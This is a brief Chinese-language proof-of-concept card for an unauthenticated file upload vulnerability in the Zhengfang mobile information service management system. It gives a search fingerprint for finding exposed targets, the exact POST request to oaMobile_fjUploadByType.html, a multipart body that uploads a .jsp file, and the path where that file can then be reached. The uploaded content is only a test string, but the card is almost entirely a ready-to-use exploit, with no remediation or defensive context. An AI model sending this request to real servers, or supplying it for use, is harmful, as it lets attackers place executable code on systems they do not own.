# 正方移动信息服务管理系统Mobile_fjUploadByType.html文件上传漏洞

- **系统**：正方移动信息服务管理系统Mobile_fjUploadByType.html　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="正方软件股份有限公司"`
- **请求**：`POST /zftal-mobile/oaMobile/oaMobile_fjUploadByType.html HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk…`　`Content-Length: 457`

**请求体 / payload**
```
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="yhm"
123
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="zid"
456
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="sign"
789
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="123.jsp"
Content-Type: text/plain
111
------WebKitFormBoundary7MA4YWxkTrZu0gW--
上传定位：http://ip/zftal-mobile/oaFjUploadByType/123.jsp
```
- **预期**：200　|　—